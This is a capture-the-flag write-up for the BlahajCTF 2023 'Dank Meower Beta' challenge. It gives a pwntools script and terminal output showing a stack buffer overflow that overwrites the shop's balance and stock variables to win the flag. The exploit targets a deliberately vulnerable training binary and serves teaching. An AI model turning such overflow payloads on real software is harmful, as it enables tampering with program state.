---
title: Dank Meower Beta
date: 2023-12-03
tags: pwn
categories: BlahajCTF 2023
---

> I want to make a discord bot but I don't know how to use discord.py, so I made a prototype in C.

> Pst! I heard you were looking to get some flags from that flag shop over there, but they were out of stock. Luckily, I think I can help you with that... I've attached the source code of the shop [here](https://gist.github.com/azazazo/de242e67acada5e16be7c3b0745b5525), and you can download the binary [here](https://github.com/azazazo/blahajctf-files/raw/main/dank%20meower%20beta/guide). Contact me at `nc 188.166.197.31 30003` if you're still keen...

This is a simple buffer overflow challenge, with a helpful stack diagram even showing you the layout of the stack itself. The challenge already does a helpful job of explaining the basics of a buffer overflow. The stack diagram thing was cool and helpful. However, it seems that many people were stuck on how to give themselves the $2,147,483,647 (`0x7fffffff`) required to get the flag, since that requires one to input `0x7fffffff` as little-endian.

We can send the `0x7fffffff` input with a pwntools script:

{% ccb caption:solve.py gutter1:1-11 lang:py %}
from pwn import *
# target = process("./guide") # use this for local testing
target = remote("104.248.97.96", 30001)
for i in range(12):
    target.sendline(b'') # press enter through the buffer overflow guide

target.sendline(p64(0x1) + p32(0x1) + p32(0x1) + p32(0x1) + p32(2147483647)) # payload
target.sendline(b'2') # shop
target.recvline()
target.sendline(b'3') # buy flag
target.interactive()
{% endccb %}

Now let's look at our buffer overflow payload:
{% ccb lang:py caption:solve.py gutter1:7 %}
target.sendline(p64(0x1) + p32(0x1) + p32(0x1) + p32(0x1) + p32(2147483647)) # payload
{% endccb %}

{% ccb html:true terminal:true %}
<DIV STYLE="display:inline-block;white-space:pre;font-family:'Jetbrains Mono','Menlo',monospace;font-size:14px;"><SPAN STYLE="color:#DCDFE4;">lower &gt;---------------------------------------------stack direction----------------------------------------------&gt; higher<BR>  choice                                  </SPAN><SPAN STYLE="color:#61AFEF;">in_</SPAN><SPAN STYLE="color:#98C379;">sto</SPAN><SPAN STYLE="color:#E5C07B;">ck                                                    </SPAN><SPAN STYLE="color:#E06C75;">balance<BR></SPAN><SPAN STYLE="color:#DCDFE4;">┌────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┐<BR>│ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │</SPAN><SPAN STYLE="color:#61AFEF;"> 01 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#61AFEF;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#61AFEF;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#61AFEF;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#98C379;"> 01 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#98C379;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#98C379;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#98C379;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E5C07B;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E5C07B;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E5C07B;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E5C07B;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E06C75;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E06C75;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E06C75;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E06C75;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│<BR>└────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┘<BR><BR><BR>Current balance: $0<BR>1) Beg for money<BR>2) Visit shop<BR>3) Exit<BR>lower &gt;---------------------------------------------stack direction----------------------------------------------&gt; higher<BR>  choice                                  </SPAN><SPAN STYLE="color:#61AFEF;">in_</SPAN><SPAN STYLE="color:#98C379;">sto</SPAN><SPAN STYLE="color:#E5C07B;">ck                                       </SPAN><SPAN STYLE="color:#DCDFE4;">             </SPAN><SPAN STYLE="color:#E06C75;">balance<BR></SPAN><SPAN STYLE="color:#DCDFE4;">┌────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┐<BR>│ 01 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │</SPAN><SPAN STYLE="color:#61AFEF;"> 01 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#61AFEF;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#61AFEF;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#61AFEF;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#98C379;"> 01 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#98C379;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#98C379;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#98C379;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E5C07B;"> 01 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E5C07B;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E5C07B;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E5C07B;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E06C75;"> ff </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E06C75;"> ff </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E06C75;"> ff </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E06C75;"> 7f </SPAN><SPAN STYLE="color:#DCDFE4;">│<BR>└────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┘<BR><BR><BR>1) Beg for money<BR>2) Visit shop<BR>3) Exit</SPAN></DIV>
{% endccb %}

We have overwriten `choice` with the value of 1, overwritten the stock counts of all three items with 1, and overwritten the value of balance with `0x7fffffff`

We can then proceed to buy the flag:

{% ccb html:true terminal:true %}
<DIV STYLE="display:inline-block;white-space:pre;font-family:'Jetbrains Mono','Menlo',monospace;font-size:14px;"><SPAN STYLE="color:#DCDFE4;">lower &gt;---------------------------------------------stack direction----------------------------------------------&gt; higher<BR>  choice                                  </SPAN><SPAN STYLE="color:#61AFEF;">in_</SPAN><SPAN STYLE="color:#98C379;">sto</SPAN><SPAN STYLE="color:#E5C07B;">ck                                       </SPAN><SPAN STYLE="color:#DCDFE4;">             </SPAN><SPAN STYLE="color:#E06C75;">balance<BR></SPAN><SPAN STYLE="color:#DCDFE4;">┌────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┐<BR>│ 01 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │</SPAN><SPAN STYLE="color:#61AFEF;"> 01 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#61AFEF;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#61AFEF;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#61AFEF;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#98C379;"> 01 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#98C379;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#98C379;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#98C379;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E5C07B;"> 01 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E5C07B;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E5C07B;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E5C07B;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E06C75;"> ff </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E06C75;"> ff </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E06C75;"> ff </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E06C75;"> 7f </SPAN><SPAN STYLE="color:#DCDFE4;">│<BR>└────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┘<BR><BR><BR>1) Beg for money<BR>2) Visit shop<BR>3) Exit<BR>lower &gt;---------------------------------------------stack direction----------------------------------------------&gt; higher<BR>  choice                                  </SPAN><SPAN STYLE="color:#61AFEF;">in_</SPAN><SPAN STYLE="color:#98C379;">sto</SPAN><SPAN STYLE="color:#E5C07B;">ck                                                    </SPAN><SPAN STYLE="color:#E06C75;">balance<BR></SPAN><SPAN STYLE="color:#DCDFE4;">┌────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┐<BR>│ 32 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │</SPAN><SPAN STYLE="color:#61AFEF;"> 01 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#61AFEF;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#61AFEF;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#61AFEF;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#98C379;"> 01 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#98C379;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#98C379;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#98C379;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E5C07B;"> 01 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E5C07B;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E5C07B;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E5C07B;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E06C75;"> ff </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E06C75;"> ff </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E06C75;"> ff </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E06C75;"> 7f </SPAN><SPAN STYLE="color:#DCDFE4;">│<BR>└────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┘<BR>   </SPAN><SPAN STYLE="color:#56B6C2;">2<BR><BR><BR></SPAN><SPAN STYLE="color:#DCDFE4;">Welcome to the shop! What would you like to buy?<BR>1) Small blahaj (in stock) - $10<BR>2) Big blahaj (in stock) - $30<BR>3) Flag (in stock) - $2,147,483,647<BR></SPAN><SPAN STYLE="color:#E06C75;">$<BR></SPAN><SPAN STYLE="color:#DCDFE4;">lower &gt;---------------------------------------------stack direction----------------------------------------------&gt; higher<BR>  choice                                  </SPAN><SPAN STYLE="color:#61AFEF;">in_</SPAN><SPAN STYLE="color:#98C379;">sto</SPAN><SPAN STYLE="color:#E5C07B;">ck                                                    </SPAN><SPAN STYLE="color:#E06C75;">balance<BR></SPAN><SPAN STYLE="color:#DCDFE4;">┌────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┐<BR>│ 33 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │</SPAN><SPAN STYLE="color:#61AFEF;"> 01 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#61AFEF;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#61AFEF;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#61AFEF;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#98C379;"> 01 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#98C379;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#98C379;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#98C379;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E5C07B;"> 01 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E5C07B;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E5C07B;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E5C07B;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E06C75;"> ff </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E06C75;"> ff </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E06C75;"> ff </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E06C75;"> 7f </SPAN><SPAN STYLE="color:#DCDFE4;">│<BR>└────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┘<BR>   </SPAN><SPAN STYLE="color:#56B6C2;">3<BR></SPAN><SPAN STYLE="color:#DCDFE4;">lower &gt;---------------------------------------------stack direction----------------------------------------------&gt; higher<BR>  choice                                  </SPAN><SPAN STYLE="color:#61AFEF;">in_</SPAN><SPAN STYLE="color:#98C379;">sto</SPAN><SPAN STYLE="color:#E5C07B;">ck                                                    </SPAN><SPAN STYLE="color:#E06C75;">balance<BR></SPAN><SPAN STYLE="color:#DCDFE4;">┌────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┐<BR>│ 33 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │ 00 │</SPAN><SPAN STYLE="color:#61AFEF;"> 01 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#61AFEF;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#61AFEF;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#61AFEF;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#98C379;"> 01 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#98C379;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#98C379;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#98C379;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E5C07B;"> 01 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E5C07B;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E5C07B;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E5C07B;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E06C75;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E06C75;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E06C75;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│</SPAN><SPAN STYLE="color:#E06C75;"> 00 </SPAN><SPAN STYLE="color:#DCDFE4;">│<BR>└────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┘<BR>   </SPAN><SPAN STYLE="color:#56B6C2;">3<BR><BR></SPAN><SPAN STYLE="color:#DCDFE4;">Congratulations! You now have your very own flag!<BR>Here's your flag: blahaj{buFf3r_50Lu710n5_R35157_cH4n935_1n_pH}<BR><BR>Current balance: $0<BR>1) Beg for money<BR>2) Visit shop<BR>3) Exit<BR></SPAN><SPAN STYLE="color:#E06C75;">$</SPAN></DIV>
{% endccb %}
